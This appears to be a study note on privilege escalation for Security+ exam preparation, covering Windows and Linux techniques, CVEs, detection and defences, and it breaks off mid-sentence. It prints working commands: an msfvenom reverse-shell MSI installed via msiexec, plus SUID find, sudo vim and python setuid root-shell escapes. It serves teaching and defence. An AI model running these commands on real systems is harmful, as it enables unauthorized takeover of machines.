```markdown
---
domain: "offensive-security"
tags: [privilege-escalation, attack, post-exploitation, windows, linux, mitre-attack]
---
# Escalation

**Privilege escalation** is the process by which an attacker gains a higher level of access than originally granted, moving from a low-privileged foothold to administrator, SYSTEM, or root control over a target system. It sits within the **post-exploitation** phase of the attack lifecycle and is mapped to [[MITRE ATT&CK]] tactic **TA0004 – Privilege Escalation**. Escalation is almost always a prerequisite for achieving mission objectives such as [[Lateral Movement]], data exfiltration, or persistence.

---

## Overview

Privilege escalation exists because modern operating systems are built on a principle of tiered trust: ordinary users can only read their own files, modify their own processes, and run programs within defined bounds, while administrators and the kernel have unrestricted control. The gap between these tiers is the attack surface. When software is misconfigured, vulnerable, or leaves unnecessary permissions exposed, an attacker already inside the system can exploit those gaps to climb the privilege hierarchy.

There are two fundamental forms of escalation. **Vertical escalation** moves a principal *up* the privilege hierarchy — a standard user account becoming a local administrator, or a web application service account becoming SYSTEM. **Horizontal escalation** moves *sideways* within the same privilege tier, allowing an attacker to access data or functionality belonging to a different user at the same privilege level — for example, reading another user's files or hijacking their authenticated session without ever gaining admin rights. The Security+ exam treats these as distinct, testable concepts.

The motivation behind escalation is practical: initial access — through phishing, an exposed web shell, or a misconfigured service — rarely yields high-privilege credentials. Attackers need elevated rights to disable security tools, dump credentials from memory (e.g., with Mimikatz), create persistent backdoors, or pivot to other machines. Without escalation, the attacker is contained. With it, the network becomes open.

In enterprise environments, escalation frequently targets Windows Active Directory environments because the distinction between local administrator, domain user, domain administrator, and Enterprise Administrator creates multiple rungs worth climbing. On Linux systems, the target is typically root or a service account that owns sensitive data. Containerized and cloud environments introduce additional planes — cloud IAM role abuse and container escapes are modern variants of the same concept.

Real-world incidents confirm the centrality of escalation: the SolarWinds supply-chain attack (2020) used escalated SYSTEM-level access to deploy the SUNBURST implant persistently. Ransomware operators routinely spend hours to days escalating privileges before deploying their payload to maximize encryption coverage across mapped drives and domain shares.

---

## How It Works

### Vertical Escalation on Windows

**1. Unquoted Service Paths**  
Windows service binaries with spaces in their paths, not wrapped in quotes, allow an attacker who can write to an intermediate directory to plant a malicious executable that the Service Control Manager will execute as SYSTEM.

```
# Enumerate vulnerable services
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"

# Example vulnerable path:
# C:\Program Files\My Service\service.exe
# Attacker plants: C:\Program.exe → executed first as SYSTEM
```

**2. Weak Service Permissions (writable BINARY path)**  
If a low-privileged user has `SERVICE_CHANGE_CONFIG` or write access to the service binary itself:

```powershell
# PowerUp (PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Manual: check ACLs on service binary
icacls "C:\Program Files\VulnService\vuln.exe"
```

**3. AlwaysInstallElevated**  
When both `HKCU` and `HKLM` registry keys are set to `1`, any MSI package can be installed with SYSTEM privileges by any user.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploit: craft a malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

**4. Token Impersonation (SeImpersonatePrivilege)**  
Service accounts (IIS, MSSQL) frequently hold `SeImpersonatePrivilege`. Attackers abuse this using the **Potato** family of exploits (JuicyPotato, RoguePotato, PrintSpoofer) to escalate to SYSTEM by tricking a privileged COM object into authenticating to an attacker-controlled named pipe.

```cmd
# Check current token privileges
whoami /priv

# PrintSpoofer usage (Windows 10/Server 2019)
PrintSpoofer.exe -i -c cmd
```

**5. DLL Search Order Hijacking**  
Windows searches for DLLs in a predictable order. If a writable directory appears before the legitimate path, a planted DLL is loaded by the higher-privilege process.

**6. UAC Bypass**  
[[UAC]] (User Account Control) is not a security boundary; it is a convenience control. Dozens of documented bypasses (e.g., `fodhelper.exe`, `eventvwr.exe` COM object hijack) allow a medium-integrity process to spawn a high-integrity process without a UAC prompt.

---

### Vertical Escalation on Linux

**1. SUID/SGID Misconfiguration**  
Files with the SUID bit set run as the file owner regardless of who executes them. Custom or misconfigured SUID binaries are prime targets. [[GTFOBins]] documents shells, file reads, and privilege escalation paths for common UNIX binaries.

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Example: SUID find binary → root shell
find . -exec /bin/bash -p \; -quit
```

**2. Sudo Misconfigurations**  
`/etc/sudoers` entries granting `NOPASSWD` or overly broad commands allow escalation without knowing the root password.

```bash
sudo -l   # list allowed commands

# Example misconfiguration: user ALL=(ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
```

**3. Writable Cron Jobs**  
Cron jobs running as root that reference world-writable scripts or directories allow payload injection.

```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

**4. PATH Hijacking**  
If a root-owned script calls binaries without absolute paths and an attacker controls an earlier directory in `$PATH`, a malicious replacement binary executes as root.

**5. Linux Capabilities**  
Fine-grained privilege attributes assigned to binaries. `cap_setuid+ep` on Python allows trivial escalation.

```bash
getcap -r / 2>/dev/null
# Vulnerable: /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**6. Kernel Exploits**  
When no misconfiguration is exploitable, a kernel CVE may provide the last resort path.

---

## Key Concepts

- **Vertical Privilege Escalation**: Movement *up* the privilege hierarchy (e.g., user → administrator → SYSTEM/root). The most commonly exploited form and the primary focus of post-exploitation tooling like LinPEAS and WinPEAS.
- **Horizontal Privilege Escalation**: Movement *sideways* to a different account at the *same* privilege level. Examples include IDOR (Insecure Direct Object Reference) vulnerabilities in web apps granting access to another user's records, or stealing session tokens.
- **SeImpersonatePrivilege**: A Windows token privilege held by service accounts that allows them to impersonate any user who authenticates to them. Routinely abused by the Potato exploit family to obtain SYSTEM tokens.
- **SUID (Set User ID)**: A Linux permission bit that causes an executable to run with the file owner's privileges rather than the caller's. Misapplied on powerful binaries or custom scripts creates trivial escalation paths.
- **MITRE ATT&CK TA0004**: The official MITRE tactic identifier for Privilege Escalation, containing techniques such as T1548 (Abuse Elevation Control Mechanism), T1055 (Process Injection), T1574 (Hijack Execution Flow), and T1068 (Exploitation for Privilege Escalation).
- **LOLBins / GTFOBins**: Living-Off-the-Land Binaries — legitimate system tools (Windows: [[LOLBAS]]; Linux: [[GTFOBins]]) that can be abused for escalation without dropping custom malware, bypassing application whitelisting.
- **Access Token**: A Windows kernel object describing a security context (user SID, group memberships, privileges). Processes inherit or duplicate tokens; manipulating tokens is the core mechanism behind impersonation attacks.

---

## Exam Relevance

**SY0-701 Objective Mapping**: Domain 2 – Threats, Vulnerabilities & Mitigations; Domain 4 – Security Operations (detection).

**High-frequency question patterns:**

- *"A user gains access to another user's files without gaining administrator rights — which type of escalation is this?"* → **Horizontal** escalation. Many candidates reflexively answer "vertical." The key discriminator is whether the privilege *level* changed.
- *"Which attack allows a low-privileged service account to become SYSTEM by abusing a Windows token privilege?"* → **Token impersonation / SeImpersonatePrivilege**, associated with the Potato exploit family.
- *"A tester finds a binary with the SUID bit set owned by root. What is the risk?"* → The binary executes as root regardless of who runs it, creating a privilege escalation vector.
- *"Which Windows feature should be configured to restrict local administrator account reuse across machines?"* → **LAPS** (Local Administrator Password Solution) — tests both the escalation concept and its mitigation.

**Gotchas:**
- Do not confuse **privilege escalation** with **lateral movement**. Lateral movement means pivoting to a *different host*; privilege escalation is gaining *higher access on the current host*. The exam treats these as distinct phases.
- **UAC is not a security boundary** — this is Microsoft's own stated position. UAC bypass is vertical escalation because UAC operates between Medium and High integrity, not between user and kernel.
- SUID questions on the exam tend to be Linux-specific; Windows equivalents (service permissions, token privileges) are tested separately.
- "Least privilege" appears as the canonical mitigation for escalation in almost every scenario-based question.

---

## Security Implications

### Vulnerabilities and CVEs

**CVE-2021-34527 – PrintNightmare (Windows Print Spooler)**  
A critical Windows Print Spooler remote code execution and local privilege escalation vulnerability. An authenticated attacker could exploit the spooler service to run arbitrary code as SYSTEM. Widely exploited in the wild within days of disclosure. Affected all supported Windows versions and required emergency out-of-band patching.

**CVE-2021-4034 – PwnKit (Polkit pkexec)**  
A memory corruption vulnerability in `pkexec`, the SUID-root binary shipped with Polkit on virtually every major Linux distribution. Exploitation is trivially reliable and provides an immediate root shell regardless of Polkit daemon state. Existed in the codebase since 2009. Proof-of-concept code was public within hours of disclosure.

**CVE-2022-0847 – Dirty Pipe (Linux Kernel)**  
A Linux kernel pipe-splicing vulnerability allowing any local user to overwrite the contents of read-only files (including SUID binaries and `/etc/passwd`). Affected kernels 5.8 through 5.16.10. Exploitation trivially produces a root shell by overwriting the SUID bit of a known binary.

**CVE-2016-5195 – Dirty COW (Linux Kernel)**  
A race condition in the kernel's copy-on-write implementation. Allowed unprivileged users to write to read-only memory mappings, enabling modification of SUID executables. Exploited in the wild before patches were available; affected Android and Linux systems for years.

### Attack Vectors

- Web application vulnerabilities (RCE, SSRF) provide initial footholds as `www-data` or `IUSR`; escalation transforms these into system-level compromise.
- Misconfigured cloud IAM roles (AWS AssumeRole privilege escalation) allow low-privilege identities to call `iam:AttachRolePolicy` or `iam:CreatePolicyVersion` to grant themselves admin permissions — a cloud-native variant of vertical escalation.
- Container breakout (e.g., privileged container, mounted `/var/run/docker.sock`) represents escalation from container context to host root.

### Detection Indicators

- **Windows Event ID 4672**: Special privileges (SeDebugPrivilege, SeImpersonatePrivilege) assigned to a new logon.
- **Windows Event ID 4688**: Process creation with elevated integrity level — especially `cmd.exe` or `powershell.exe` spawned by service processes.
- **Sysmon Event ID 1**: Process creation with full command-line logging; detects Potato exploit invocations and PowerUp activity.
- **Linux auditd**: Rule `-a always,exit -F arch=b64 -S execve` combined with UID tracking detects processes executing with effective UID 0 from unexpected parents.
- **EDR Behavioral**: Spawning of shells from web server processes, token manipulation API calls (`ImpersonateNamedPipeClient`, `DuplicateTokenEx`).

---

## Defensive Measures

**1. Least Privilege (Principle of Least Privilege)**  
Assign only the minimum permissions required. Service accounts should not have interactive logon rights or membership in privileged groups. Audit group memberships quarterly. In Linux, audit `/etc/sudoers` with `visudo` and prohibit wildcard entries.

**2. LAPS – Local Administrator Password Solution**  
Deploy [[LAPS]] in Active Directory environments to randomize the local Administrator password on every workstation. Eliminates lateral movement and escalation via credential reuse (pass-the-hash with the built-in Administrator SID).

```powershell
# Verify LAPS deployment
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | Where-Object {$_.'ms-Mcs-AdmPwdExpirationTime' -ne $null}
```

**3. Remove Unnecessary SUID Binaries (Linux)**  
Audit SUID/SGID binaries regularly and remove the bit from anything not required for system operation.

```bash
find / -perm -4000 -o -perm -2000 2>/dev/null | xargs ls -la
chmod u-s /path/to/unnecessary/binary
```

**4. Patch Management**  
Kernel and OS-level escalation CVEs (PwnKit, Dirty Pipe, PrintNightmare) require rapid patch deployment. Maintain a vulnerability management program with SLA thresholds — critical CVEs with public exploits should be patched within 24–72 hours.

**5. AppLocker / Windows Defender Application Control (WDAC)**  
Restrict which executables, scripts, and MSI files can run. Prevents `AlwaysInstallElevated` abuse and limits the effectiveness of Potato-family exploits by constraining what binaries can be executed.

**6. Privileged Access Workstations (PAWs) and JIT Access**  
Require administrators to use dedicated hardened workstations for privileged tasks. Implement Just-in-Time (JIT) access so admin rights are granted only for bounded time windows, reducing the exposure surface for token theft.

**7. SELinux / AppArmor**  
Mandatory access control frameworks for Linux that constrain even root-privileged processes. A process running as root but confined by an SELinux policy cannot read files outside its designated domain, significantly raising the bar for post-escalation impact.

**8. Audit sudo and